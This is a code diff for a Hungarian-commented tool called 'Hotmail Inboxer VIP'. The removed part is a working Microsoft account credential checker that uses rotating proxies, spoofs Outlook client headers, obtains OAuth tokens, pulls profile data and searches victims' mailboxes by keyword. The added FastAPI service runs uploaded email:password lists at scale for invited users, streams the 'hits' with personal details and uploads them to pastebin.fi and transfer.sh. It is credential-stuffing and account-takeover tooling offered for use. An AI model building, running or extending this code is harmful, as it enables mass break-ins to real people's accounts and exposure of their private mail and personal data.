@@ -1,451 +1,459 @@
+from fastapi import FastAPI, UploadFile, Form, WebSocket, WebSocketDisconnect, Depends, HTTPException
+from fastapi.responses import HTMLResponse, PlainTextResponse
+from fastapi.templating import Jinja2Templates
+from fastapi.staticfiles import StaticFiles
+from starlette.requests import Request
+from starlette.middleware.cors import CORSMiddleware
+from contextlib import asynccontextmanager
+import asyncio
+import threading
+import os
+import json
 import requests
 import uuid
-import json
-import re
-import time
-import random
+from datetime import datetime
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+from database import *
+from auth import create_access_token, decode_token, get_current_user, hash_password, verify_password
+from checker import checker_worker_single
 from proxy_manager import proxy_manager
 
-# Fix User-Agentek
-USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
-]
+user_connections = {}
+ws_lock = threading.Lock()
+stop_flags = {}
+stop_lock = threading.Lock()
 
-PROXY_RETRIES = 999  # Gyakorlatilag végtelen retry
-
-
-def generate_user_agent():
-    return random.choice(USER_AGENTS)
+MAX_WORKERS = 60  # Optimizált sebesség
+ADMIN_EMAIL = "xat.king6969@gmail.com"
 
 
-def checker_worker_single(email: str, password: str, keyword: str):
-    """
-    LOGIKA:
-    - Ha proxy hiba / nem tölt be az oldal → ERROR → következő proxy (retry)
-    - Ha Microsoft oldal betöltött de rossz jelszó → BAD (végleges)
-    - Ha Microsoft oldal betöltött és jó jelszó → HIT/CUSTOM
-    """
-    if proxy_manager.get_count() > 0:
-        for attempt in range(PROXY_RETRIES):
-            proxy_dict = proxy_manager.get_proxy()
-            session = requests.Session()
-            if proxy_dict:
-                session.proxies = proxy_dict
-
-            try:
-                result = _do_check(session, email, password, keyword)
-
-                # ✅ VÉGLEGES eredmények (nem retry)
-                if result["status"] in ("hit", "custom", "bad"):
-                    return result
-
-                # ❌ Proxy/hálózati hiba → következő proxyval próbálja
-                # (status == "error")
-                
-            except Exception:
-                # Exception is proxy/hálózat hiba → retry
-                pass
-            finally:
-                session.close()
-
-            time.sleep(0.05)
-
-    return {"status": "error", "reason": "All proxies failed"}
-
-
-def _do_check(session, email, password, keyword):
-    """
-    VISSZATÉRÉSI ÉRTÉKEK:
-    - "error" → Proxy nem működik / oldal nem töltött be → RETRY másik proxyval!
-    - "bad"   → Microsoft oldal betöltött, de rossz jelszó → VÉGLEGES
-    - "hit"   → Microsoft oldal betöltött, jó jelszó, van email → VÉGLEGES
-    - "custom"→ Microsoft oldal betöltött, jó jelszó, nincs email → VÉGLEGES
-    """
+def upload_to_external_api(content: str, filename: str) -> str:
+    if not content or len(content.strip()) == 0:
+        return None
     try:
-        user_agent = generate_user_agent()
+        res = requests.post("https://pastebin.fi/documents", data=content.encode('utf-8'), timeout=10)
+        if res.status_code == 200:
+            key = res.json().get("key")
+            return f"https://pastebin.fi/raw/{key}"
+    except:
+        pass
+    try:
+        res = requests.put(f"https://transfer.sh/{filename}", data=content.encode('utf-8'), timeout=15)
+        if res.status_code == 200:
+            return res.text.strip()
+    except:
+        pass
+    return None
 
-        # ====== STEP 1: GET login page ======
-        url = (
-            "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?"
-            f"client_info=1&haschrome=1&login_hint={email}"
-            "&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
-            "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
-            "&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
-        )
 
-        headers = {
-            "Connection": "keep-alive",
-            "Upgrade-Insecure-Requests": "1",
-            "User-Agent": user_agent,
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
-            "return-client-request-id": "false",
-            "client-request-id": str(uuid.uuid4()),
-            "x-ms-sso-ignore-sso": "1",
-            "correlation-id": str(uuid.uuid4()),
-            "x-client-ver": "1.1.0+9e54a0d1",
-            "x-client-os": "28",
-            "x-client-sku": "MSAL.xplat.android",
-            "x-client-src-sku": "MSAL.xplat.android",
-            "X-Requested-With": "com.microsoft.outlooklite",
-            "Sec-Fetch-Site": "none",
-            "Sec-Fetch-Mode": "navigate",
-            "Sec-Fetch-User": "?1",
-            "Sec-Fetch-Dest": "document",
-            "Accept-Encoding": "gzip, deflate",
-            "Accept-Language": "en-US,en;q=0.9",
-        }
+@asynccontextmanager
+async def lifespan(app: FastAPI):
+    print("\n🚀 Hotmail Inboxer VIP - Szerver indítása...")
 
+    async def initial_proxy_setup():
+        print("🔄 Proxyk letöltése és tesztelése a háttérben...")
         try:
-            response = session.get(url, headers=headers, allow_redirects=True, timeout=30)
-        except requests.exceptions.RequestException as e:
-            # 🔄 PROXY/HÁLÓZAT HIBA → RETRY!
-            return {"status": "error", "reason": f"GET request failed: {str(e)[:50]}"}
-
-        response_text = response.text
-
-        # 🔍 ELLENŐRIZZÜK: Microsoft oldal-e?
-        # Ha NEM Microsoft oldal → proxy szar → RETRY!
-        is_microsoft = (
-            "PPFT" in response_text or
-            "urlPost" in response_text or
-            "login.microsoftonline.com" in response_text or
-            "login.live.com" in response_text or
-            "sFTTag" in response_text
-        )
-
-        if not is_microsoft:
-            # 🔄 PROXY NEM MICROSOFT OLDALT ADOTT VISSZA → RETRY!
-            return {"status": "error", "reason": "Not a Microsoft page (proxy issue)"}
-
-        # ✅ Microsoft oldal betöltött, folytatjuk
-
-        # ====== STEP 2: Parse PPFT & urlPost ======
-        PPFT = ""
-        urlPost = ""
-
-        server_data_pattern = r'var ServerData = ({.*?});'
-        server_data_match = re.search(server_data_pattern, response_text, re.DOTALL)
-
-        if server_data_match:
-            try:
-                server_data_json = server_data_match.group(1)
-                server_data = json.loads(server_data_json)
-                sFTTag = server_data.get('sFTTag', '')
-                if sFTTag:
-                    ppft_pattern = r'value="([^"]+)"'
-                    ppft_match = re.search(ppft_pattern, sFTTag)
-                    if ppft_match:
-                        PPFT = ppft_match.group(1)
-                urlPost = server_data.get('urlPost', '')
-            except json.JSONDecodeError:
-                pass
-
-        if not PPFT:
-            start_marker = 'name="PPFT" value="'
-            start_index = response_text.find(start_marker)
-            if start_index != -1:
-                start_index += len(start_marker)
-                end_index = response_text.find('"', start_index)
-                PPFT = response_text[start_index:end_index] if end_index != -1 else ""
-
-        if not urlPost:
-            urlpost_pattern = r'"urlPost":"([^"]+)"'
-            urlpost_match = re.search(urlpost_pattern, response_text)
-            if urlpost_match:
-                urlPost = urlpost_match.group(1)
-
-        # Ha nincs PPFT vagy urlPost → hiba (de Microsoft oldalt kaptunk, szóval valódi bad lehet)
-        if not PPFT or not urlPost:
-            # 🔄 Inkább retry, hátha másik proxyval működik
-            return {"status": "error", "reason": "No PPFT/urlPost"}
-
-        # ====== STEP 3: POST credentials ======
-        cookies_dict = session.cookies.get_dict()
-        MSPRequ = cookies_dict.get('MSPRequ', '')
-        uaid_cookie = cookies_dict.get('uaid', '')
-        MSPOK = cookies_dict.get('MSPOK', '')
-        OParams = cookies_dict.get('OParams', '')
-        referer_url = response.url
-
-        data_string = (
-            f"i13=1&login={email}&loginfmt={email}"
-            f"&type=11&LoginOptions=1&lrt=&lrtPartition="
-            f"&hisRegion=&hisScaleUnit=&passwd={password}"
-            f"&ps=2&psRNGCDefaultType=&psRNGCEntropy="
-            f"&psRNGCSLK=&canary=&ctx=&hpgrequestid="
-            f"&PPFT={PPFT}&PPSX=Passport&NewUser=1"
-            f"&FoundMSAs=&fspost=0&i21=0"
-            f"&CookieDisclosure=0&IsFidoSupported=0"
-            f"&isSignupPost=0&isRecoveryAttemptPost=0&i19=3772"
-        )
-
-        headers_post = {
-            "User-Agent": user_agent,
-            "Pragma": "no-cache",
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
-            "Host": "login.live.com",
-            "Connection": "keep-alive",
-            "Content-Length": str(len(data_string)),
-            "Cache-Control": "max-age=0",
-            "Upgrade-Insecure-Requests": "1",
-            "Origin": "https://login.live.com",
-            "Content-Type": "application/x-www-form-urlencoded",
-            "X-Requested-With": "com.microsoft.outlooklite",
-            "Sec-Fetch-Site": "same-origin",
-            "Sec-Fetch-Mode": "navigate",
-            "Sec-Fetch-User": "?1",
-            "Sec-Fetch-Dest": "document",
-            "Referer": referer_url,
-            "Accept-Encoding": "gzip, deflate",
-            "Accept-Language": "en-US,en;q=0.9",
-            "Cookie": f"MSPRequ={MSPRequ}; uaid={uaid_cookie}; MSPOK={MSPOK}; OParams={OParams}",
-        }
-
-        try:
-            post_response = session.post(
-                urlPost, data=data_string,
-                headers=headers_post,
-                allow_redirects=False, timeout=30
+            await asyncio.to_thread(proxy_manager.fetch_proxies)
+            working_count = await asyncio.to_thread(
+                proxy_manager.test_and_filter,
+                3000, 500, 8
             )
-        except requests.exceptions.RequestException as e:
-            # 🔄 POST hiba → RETRY másik proxyval!
-            return {"status": "error", "reason": f"POST request failed: {str(e)[:50]}"}
+            print(f"✅ Proxy setup kész! Működő: {working_count}")
+        except Exception as e:
+            print(f"⚠️ Proxy hiba indításkor: {e}")
 
-        # ====== STEP 4: Check auth cookie ======
-        post_cookies = session.cookies.get_dict()
+    asyncio.create_task(initial_proxy_setup())
 
-        # 🎯 EZ A DÖNTŐ PONT:
-        # Ha __Host-MSAAUTHP cookie NINCS → Microsoft elutasította → BAD (végleges!)
-        if "__Host-MSAAUTHP" not in post_cookies:
-            # Ellenőrizzük hogy valódi Microsoft hibaüzenet-e
-            post_text = post_response.text if post_response.text else ""
-            
-            is_real_error = (
-                "sErrTxt" in post_text or
-                "incorrect" in post_text.lower() or
-                "error" in post_text.lower() or
-                "PPFT" in post_text or  # Visszadta a login oldalt
-                "urlPost" in post_text
-            )
+    async def proxy_refresh_loop():
+        while True:
+            await asyncio.sleep(2700)
+            await asyncio.to_thread(proxy_manager.fetch_and_test)
 
-            if is_real_error:
-                # ✅ Valódi Microsoft válasz, rossz jelszó → BAD (végleges, nem retry!)
-                return {"status": "bad", "reason": "Wrong password"}
-            else:
-                # 🔄 Gyanús válasz, nem biztos hogy Microsoft → RETRY!
-                return {"status": "error", "reason": "No auth cookie, suspicious response"}
+    refresh_task = asyncio.create_task(proxy_refresh_loop())
 
-        # ✅ __Host-MSAAUTHP megvan → bejelentkezett!
+    try:
+        from pymongo import MongoClient
+        sync_client = MongoClient(os.getenv("MONGODB_URL"))
+        db = sync_client.hotmail_checker
+        db.runs.update_many(
+            {"status": "running"},
+            {"$set": {"status": "finished", "finished_at": datetime.utcnow()}}
+        )
+        sync_client.close()
+    except:
+        pass
 
-        # ====== STEP 5: Extract auth code ======
-        auth_code = ""
-        post_text = post_response.text if post_response.text else ""
+    yield
 
-        if post_response.status_code in [301, 302, 303, 307, 308]:
-            redirect_url = post_response.headers.get('Location', '')
-            if redirect_url and 'msauth://' in redirect_url and 'code=' in redirect_url:
-                auth_code = redirect_url.split('code=')[1].split('&')[0]
-        else:
-            redirect_pattern = r'window\.location\s*=\s*["\']([^"\']+)["\']'
-            redirect_match = re.search(redirect_pattern, post_text)
-            if redirect_match:
-                redirect_url = redirect_match.group(1)
-                if 'msauth://' in redirect_url and 'code=' in redirect_url:
-                    auth_code = redirect_url.split('code=')[1].split('&')[0]
+    print("\n🛑 Leállás...")
+    refresh_task.cancel()
+    with stop_lock:
+        for user_id in list(stop_flags.keys()):
+            stop_flags[user_id].set()
 
-        CID = post_cookies.get('MSPCID', '')
-        if CID:
-            CID = CID.upper()
 
-        # ====== STEP 6: Get access token ======
-        access_token = ""
-        if auth_code:
-            url_token = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
-            data_token = {
-                "client_info": "1",
-                "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
-                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
-                "grant_type": "authorization_code",
-                "code": auth_code,
-                "scope": "profile openid offline_access https://outlook.office.com/M365.Access",
-            }
+app = FastAPI(title="Hotmail Inboxer VIP", lifespan=lifespan)
+app.add_middleware(
+    CORSMiddleware,
+    allow_origins=["*"],
+    allow_credentials=True,
+    allow_methods=["*"],
+    allow_headers=["*"],
+)
+templates = Jinja2Templates(directory="templates")
+app.mount("/static", StaticFiles(directory="static"), name="static")
+
+
+def broadcast_to_user(user_id: str, message: str):
+    with ws_lock:
+        if user_id not in user_connections:
+            return
+        dead = []
+        for ws_info in user_connections[user_id]:
             try:
-                token_response = requests.post(
-                    url_token, data=data_token,
-                    headers={"Content-Type": "application/x-www-form-urlencoded"},
-                    timeout=30
-                )
-                if token_response.status_code == 200:
-                    token_data = token_response.json()
-                    access_token = token_data.get("access_token", "")
+                asyncio.run_coroutine_threadsafe(ws_info["ws"].send_text(message), ws_info["loop"])
             except:
-                pass
+                dead.append(ws_info)
+        for d in dead:
+            user_connections[user_id].remove(d)
 
-        # Ha nincs access_token vagy CID → hiba (de már bejelentkezett, szóval retry)
-        if not access_token or not CID:
-            return {"status": "error", "reason": "No token after successful auth"}
 
-        # ====== STEP 7: Profile ======
-        Name = ""
-        Country = ""
-        Birthdate = "N/A"
+@app.get("/", response_class=HTMLResponse)
+async def login_page(request: Request):
+    return templates.TemplateResponse("login.html", {"request": request})
 
-        profile_url = "https://substrate.office.com/profileb2/v2.0/me/V1Profile"
-        profile_headers = {
-            "User-Agent": "Outlook-Android/2.0",
-            "Pragma": "no-cache",
-            "Accept": "application/json",
-            "ForceSync": "false",
-            "Authorization": f"Bearer {access_token}",
-            "X-AnchorMailbox": f"CID:{CID}",
-            "Host": "substrate.office.com",
-            "Connection": "Keep-Alive",
-            "Accept-Encoding": "gzip",
-        }
+@app.get("/register", response_class=HTMLResponse)
+async def register_page(request: Request):
+    return templates.TemplateResponse("register.html", {"request": request})
+
+@app.get("/dashboard", response_class=HTMLResponse)
+async def dashboard_page(request: Request):
+    return templates.TemplateResponse("dashboard.html", {"request": request})
+
+@app.get("/admin", response_class=HTMLResponse)
+async def admin_page(request: Request):
+    return templates.TemplateResponse("admin.html", {"request": request})
+
+
+@app.post("/api/register")
+async def register(email: str = Form(...), password: str = Form(...), invite_code: str = Form(...)):
+    if len(password) < 6:
+        raise HTTPException(status_code=400, detail="Minimum 6 karakter jelszó!")
+    
+    invite = await get_invite_code(invite_code)
+    if not invite or invite.get("is_used"):
+        raise HTTPException(status_code=400, detail="Érvénytelen vagy felhasznált kód!")
+
+    if await get_user_by_email(email):
+        raise HTTPException(status_code=400, detail="Ezzel az email címmel már regisztráltak!")
+    
+    await create_user(email, hash_password(password), invite_code)
+    await mark_invite_used(invite_code, email)
+    return {"token": create_access_token({"sub": email}), "email": email}
+
+
+@app.post("/api/login")
+async def login(email: str = Form(...), password: str = Form(...)):
+    user = await get_user_by_email(email)
+    if not user or not verify_password(password, user["password"]):
+        raise HTTPException(status_code=401, detail="Hibás email vagy jelszó!")
+    return {"token": create_access_token({"sub": email}), "email": email}
+
+
+@app.get("/api/me")
+async def get_me(current_user=Depends(get_current_user)):
+    return {
+        "email": current_user["email"],
+        "needs_new_invite": current_user.get("needs_new_invite", False)
+    }
+
+
+@app.post("/api/reactivate")
+async def reactivate_account(invite_code: str = Form(...), current_user=Depends(get_current_user)):
+    invite = await get_invite_code(invite_code)
+    if not invite or invite.get("is_used"):
+        raise HTTPException(status_code=400, detail="Ez a kód érvénytelen vagy már foglalt!")
+    
+    await reactivate_user(current_user["email"], invite_code)
+    await mark_invite_used(invite_code, current_user["email"])
+    return {"status": "success"}
+
+
+@app.get("/api/admin/invites")
+async def get_invites(current_user=Depends(get_current_user)):
+    if current_user["email"] != ADMIN_EMAIL:
+        raise HTTPException(status_code=403, detail="Nincs jogosultságod!")
+    
+    invites = await get_all_invites()
+    for inv in invites:
+        inv["_id"] = str(inv["_id"])
+        inv["created_at"] = inv["created_at"].isoformat()
+    return invites
+
+
+@app.post("/api/admin/generate_invite")
+async def generate_invite(current_user=Depends(get_current_user)):
+    if current_user["email"] != ADMIN_EMAIL:
+        raise HTTPException(status_code=403)
+    
+    new_code = "INBOX-" + str(uuid.uuid4()).split('-')[0].upper()
+    await create_invite_code(new_code)
+    return {"status": "success", "code": new_code}
+
+
+@app.delete("/api/admin/invites/{code}")
+async def delete_invite(code: str, current_user=Depends(get_current_user)):
+    if current_user["email"] != ADMIN_EMAIL:
+        raise HTTPException(status_code=403)
+    
+    await revoke_invite_and_lock_user(code)
+    return {"status": "deleted"}
+
+
+@app.get("/api/proxy_status")
+async def proxy_status(current_user=Depends(get_current_user)):
+    stats = proxy_manager.get_stats()
+    return {
+        "proxy_count": stats["total"],
+        "http": stats["http"],
+        "socks4": stats["socks4"],
+        "socks5": stats["socks5"],
+        "tested": proxy_manager.is_tested(),
+    }
+
+
+@app.post("/api/refresh_proxies")
+async def refresh_proxies(current_user=Depends(get_current_user)):
+    count = await asyncio.to_thread(proxy_manager.fetch_and_test)
+    stats = proxy_manager.get_stats()
+    return {
+        "proxy_count": count,
+        "http": stats["http"],
+        "socks4": stats["socks4"],
+        "socks5": stats["socks5"],
+    }
+
+
+@app.post("/api/start")
+async def start_checker(
+    file: UploadFile,
+    keyword: str = Form(...),
+    threads: int = Form(MAX_WORKERS),
+    current_user=Depends(get_current_user),
+):
+    if current_user.get("needs_new_invite"):
+        raise HTTPException(status_code=403, detail="A fiókod zárolva van!")
+
+    if await get_active_run(str(current_user["_id"])):
+        raise HTTPException(status_code=400, detail="Már fut egy keresés!")
+
+    threads = max(1, min(threads, 100))
+    content = await file.read()
+    lines = [
+        l.strip()
+        for l in content.decode("utf-8", errors="ignore").splitlines()
+        if ':' in l and '@' in l
+    ]
+    if not lines:
+        raise HTTPException(status_code=400, detail="Nincs érvényes adat a fájlban!")
+
+    user_id = str(current_user["_id"])
+    run_id = await create_run(user_id, keyword, len(lines))
+    await delete_old_runs(user_id, run_id)
+
+    with stop_lock:
+        stop_flags[user_id] = asyncio.Event()
+
+    threading.Thread(
+        target=lambda: asyncio.run(execute_checker(run_id, user_id, lines, keyword, threads)),
+        daemon=True,
+    ).start()
+
+    return {"run_id": run_id, "total": len(lines)}
+
+
+@app.post("/api/stop")
+async def stop_checker(current_user=Depends(get_current_user)):
+    user_id = str(current_user["_id"])
+    with stop_lock:
+        if user_id in stop_flags:
+            stop_flags[user_id].set()
+            return {"status": "stopping"}
+    raise HTTPException(status_code=404, detail="Nincs mit leállítani.")
+
+
+async def execute_checker(run_id: str, user_id: str, lines: list, keyword: str, num_threads: int):
+    checked = hits = custom = bad = retries = 0
+    total = len(lines)
+    main_loop = asyncio.get_event_loop()
+    lock = threading.Lock()
+
+    broadcast_to_user(user_id, json.dumps({"type": "log", "level": "info", "text": f"🚀 Indítás: {total} fiók, Szálak: {num_threads}"}))
+
+    def check_single(line):
+        nonlocal checked, hits, custom, bad, retries
+        
+        # 1. AZONNALI STOP ELLENŐRZÉS a szál belépésekor
+        with stop_lock:
+            if user_id in stop_flags and stop_flags[user_id].is_set():
+                return
 
         try:
-            pRes = requests.get(profile_url, headers=profile_headers, timeout=30)
-            if pRes.status_code == 200:
-                profile_data = pRes.json()
-                if "accounts" in profile_data and len(profile_data["accounts"]) > 0:
-                    first_account = profile_data["accounts"][0]
-                    Country = first_account.get("location", "")
-                    BD = first_account.get("birthDay", "")
-                    BM = first_account.get("birthMonth", "")
-                    BY = first_account.get("birthYear", "")
-                    if BD and BM and BY:
-                        BD_str = str(BD).zfill(2)
-                        BM_str = str(BM).zfill(2)
-                        Birthdate = f"{BY}-{BM_str}-{BD_str}"
-                if "names" in profile_data and len(profile_data["names"]) > 0:
-                    first_name = profile_data["names"][0]
-                    Name = first_name.get("displayName", "")
+            email, password = line.split(':', 1)
         except:
-            pass
+            return
 
-        # ====== STEP 8: Email search ======
-        Total = "NO"
-        Date = "N/A"
+        result = checker_worker_single(email, password, keyword)
 
-        search_url = "https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124"
-        search_payload = {
-            "Cvid": "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7",
-            "Scenario": {"Name": "owa.react"},
-            "TimeZone": "United Kingdom Standard Time",
-            "TextDecorations": "Off",
-            "EntityRequests": [{
-                "EntityType": "Conversation",
-                "ContentSources": ["Exchange"],
-                "Filter": {
-                    "Or": [
-                        {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
-                        {"Term": {"DistinguishedFolderName": "DeletedItems"}},
-                    ]
-                },
-                "From": 0,
-                "Query": {"QueryString": keyword},
-                "RefiningQueries": None,
-                "Size": 25,
-                "Sort": [
-                    {"Field": "Score", "SortDirection": "Desc", "Count": 3},
-                    {"Field": "Time", "SortDirection": "Desc"},
-                ],
-                "EnableTopResults": True,
-                "TopResultsCount": 3,
-            }],
-            "AnswerEntityRequests": [{
-                "Query": {"QueryString": keyword},
-                "EntityTypes": ["Event", "File"],
-                "From": 0,
-                "Size": 100,
-                "EnableAsyncResolution": True,
-            }],
-            "QueryAlterationOptions": {
-                "EnableSuggestion": True,
-                "EnableAlteration": True,
-                "SupportedRecourseDisplayTypes": [
-                    "Suggestion", "NoResultModification",
-                    "NoResultFolderRefinerModification",
-                    "NoRequeryModification", "Modification",
-                ],
-            },
-            "LogicalId": "446c567a-02d9-b739-b9ca-616e0d45905c",
-        }
+        # 2. AZONNALI STOP ELLENŐRZÉS MENTÉS ELŐTT
+        with stop_lock:
+            if user_id in stop_flags and stop_flags[user_id].is_set():
+                return
 
-        search_headers = {
-            "User-Agent": "Outlook-Android/2.0",
-            "Pragma": "no-cache",
-            "Accept": "application/json",
-            "ForceSync": "false",
-            "Authorization": f"Bearer {access_token}",
-            "X-AnchorMailbox": f"CID:{CID}",
-            "Host": "substrate.office.com",
-            "Connection": "Keep-Alive",
-            "Accept-Encoding": "gzip",
-            "Content-Type": "application/json",
-        }
+        with lock:
+            checked += 1
+            if result["status"] == "hit":
+                hits += 1
+                d = result["data"]
+                lt = f"[HIT] {d['email']}:{d['password']} | Ország: {d['country']} | Név: {d['name']} | Levelek: {d['mails']}"
+                asyncio.run_coroutine_threadsafe(add_result_to_run(run_id, "hit", lt), main_loop)
+                asyncio.run_coroutine_threadsafe(add_result_details_to_run(run_id, "hit", d), main_loop)
+                broadcast_to_user(user_id, json.dumps({"type": "log", "level": "hit", "text": lt}))
+                broadcast_to_user(user_id, json.dumps({"type": "live_hit", "data": d}))
 
-        try:
-            search_response = requests.post(
-                search_url, json=search_payload,
-                headers=search_headers, timeout=30
-            )
+            elif result["status"] == "custom":
+                custom += 1
+                lt = f"[LOGGED] {email}:{password} | LOGIN OK"
+                asyncio.run_coroutine_threadsafe(add_result_to_run(run_id, "custom", lt), main_loop)
+                broadcast_to_user(user_id, json.dumps({"type": "log", "level": "custom", "text": lt}))
 
-            if search_response.status_code == 200:
-                search_text = search_response.text
+            elif result["status"] == "bad":
+                bad += 1
+                # LOG JAVÍTÁS: Mindig írja ki a rosszakat a logba
+                broadcast_to_user(user_id, json.dumps({"type": "log", "level": "bad", "text": f"[BAD] {email}"}))
 
-                date_start = search_text.find('"LastModifiedTime":"')
-                if date_start != -1:
-                    date_start += len('"LastModifiedTime":"')
-                    date_end = search_text.find('"', date_start)
-                    Date = search_text[date_start:date_end] if date_end != -1 else "N/A"
+            else:
+                retries += 1
 
-                total_start = search_text.find('"Total":')
-                if total_start != -1:
-                    total_start += len('"Total":')
-                    total_end = search_text.find(',', total_start)
-                    if total_end == -1:
-                        total_end = search_text.find('}', total_start)
-                    Total = search_text[total_start:total_end] if total_end != -1 else "NO"
-        except:
-            pass
+            if checked % 10 == 0 or checked == total:
+                asyncio.run_coroutine_threadsafe(
+                    update_run_stats(run_id, {"checked": checked, "hits": hits, "custom": custom, "bad": bad, "retries": retries}),
+                    main_loop
+                )
 
-        # ====== STEP 9: Return result ======
-        if Total != "0" and Total != "NO" and Total != "":
-            return {
-                "status": "hit",
-                "data": {
-                    "email": email,
-                    "password": password,
-                    "country": Country,
-                    "name": Name,
-                    "birthdate": Birthdate,
-                    "date": Date,
-                    "mails": Total,
-                },
-            }
-        else:
-            return {
-                "status": "custom",
-                "data": {
-                    "email": email,
-                    "password": password,
-                    "country": Country,
-                    "name": Name,
-                    "birthdate": Birthdate,
-                },
-            }
+            broadcast_to_user(user_id, json.dumps({
+                "type": "stats", "run_id": run_id, "checked": checked, "hits": hits,
+                "custom": custom, "bad": bad, "retries": retries, "total": total
+            }))
 
-    # 🔄 Minden exception → error → retry másik proxyval!
-    except requests.exceptions.ProxyError:
-        return {"status": "error", "reason": "Proxy error"}
-    except requests.exceptions.ConnectTimeout:
-        return {"status": "error", "reason": "Connect timeout"}
-    except requests.exceptions.ReadTimeout:
-        return {"status": "error", "reason": "Read timeout"}
-    except requests.exceptions.ConnectionError:
-        return {"status": "error", "reason": "Connection error"}
-    except Exception as e:
-        return {"status": "error", "reason": str(e)[:80]}
+    # 3. BATCH FELDOLGOZÁS AZ AZONNALI LEÁLLÍTÁSÉRT
+    with ThreadPoolExecutor(max_workers=num_threads) as executor:
+        batch_size = num_threads * 2
+        for i in range(0, len(lines), batch_size):
+            with stop_lock:
+                if user_id in stop_flags and stop_flags[user_id].is_set():
+                    broadcast_to_user(user_id, json.dumps({"type": "log", "level": "info", "text": "🛑 Folyamat leállítva!"}))
+                    break
+            
+            batch = lines[i : i + batch_size]
+            futures = [executor.submit(check_single, line) for line in batch]
+            for f in as_completed(futures):
+                try: f.result()
+                except: pass
+
+    # Futtatás lezárása
+    final_run = await get_run(run_id)
+    hits_url = custom_url = None
+    if final_run and (hits > 0 or custom > 0):
+        broadcast_to_user(user_id, json.dumps({"type": "log", "level": "info", "text": "⏳ Eredmények mentése..."}))
+        hit_lines = final_run.get("hit_lines", [])
+        custom_lines = final_run.get("custom_lines", [])
+        if hit_lines: hits_url = await asyncio.to_thread(upload_to_external_api, "\n".join(hit_lines), f"Hits_{run_id}.txt")
+        if custom_lines: custom_url = await asyncio.to_thread(upload_to_external_api, "\n".join(custom_lines), f"Custom_{run_id}.txt")
+    
+    await finish_and_clean_run(run_id, hits_url, custom_url)
+    
+    # Értesítés a befejezésről
+    status_type = "stopped" if (user_id in stop_flags and stop_flags[user_id].is_set()) else "finished"
+    broadcast_to_user(user_id, json.dumps({"type": status_type, "run_id": run_id}))
+    broadcast_to_user(user_id, json.dumps({"type": "log", "level": "finish", "text": f"🏁 KÉSZ! Találat: {hits}"}))
+    
+    with stop_lock:
+        if user_id in stop_flags:
+            del stop_flags[user_id]
+
+
+@app.get("/api/runs")
+async def get_user_runs_list(current_user=Depends(get_current_user)):
+    runs = await get_user_finished_runs(str(current_user["_id"]))
+    for r in runs:
+        r["_id"] = str(r["_id"])
+        r["started_at"] = r["started_at"].isoformat()
+        if r.get("finished_at"):
+            r["finished_at"] = r["finished_at"].isoformat()
+    return runs
+
+
+@app.get("/api/get_download_url/{run_id}/{type}")
+async def get_download_url(run_id: str, type: str, current_user=Depends(get_current_user)):
+    run = await get_run(run_id)
+    if not run or run["user_id"] != str(current_user["_id"]):
+        raise HTTPException(status_code=404)
+    if type == "hits" and run.get("hits_url"):
+        return {"url": run["hits_url"]}
+    if type == "custom" and run.get("custom_url"):
+        return {"url": run["custom_url"]}
+    return {"url": f"/api/download_direct/{run_id}/{type}"}
+
+
+@app.get("/api/download_direct/{run_id}/{type}")
+async def download_direct(run_id: str, type: str):
+    run = await get_run(run_id)
+    if not run:
+        raise HTTPException(status_code=404)
+    lines = run.get("hit_lines" if type == "hits" else "custom_lines", [])
+    return PlainTextResponse(
+        content="\n".join(lines) if lines else "Nincs adat",
+        headers={"Content-Disposition": f'attachment; filename="Hotmail-{type}.txt"'}
+    )
+
+
+@app.websocket("/ws")
+async def websocket_endpoint(websocket: WebSocket, token: str = ""):
+    await websocket.accept()
+    email = decode_token(token)
+    if not email:
+        return await websocket.close(code=1008)
+    user = await get_user_by_email(email)
+    if not user:
+        return await websocket.close(code=1008)
+
+    user_id = str(user["_id"])
+    loop = asyncio.get_event_loop()
+    ws_info = {"ws": websocket, "loop": loop}
+    with ws_lock:
+        if user_id not in user_connections:
+            user_connections[user_id] = []
+        user_connections[user_id].append(ws_info)
+
+    try:
+        active_run = await get_active_run(user_id)
+        if active_run:
+            active_run["_id"] = str(active_run["_id"])
+            await websocket.send_text(json.dumps({"type": "active_run", "run": active_run}))
+
+        while True:
+            data = await websocket.receive_text()
+            if data == "ping":
+                await websocket.send_text("pong")
+    except:
+        with ws_lock:
+            if user_id in user_connections:
+                user_connections[user_id].remove(ws_info)
+
+
+if __name__ == "__main__":
+    import uvicorn
+    port = int(os.getenv("PORT", 8000))
+    uvicorn.run("main:app", host="0.0.0.0", port=port, reload=False, log_level="info")
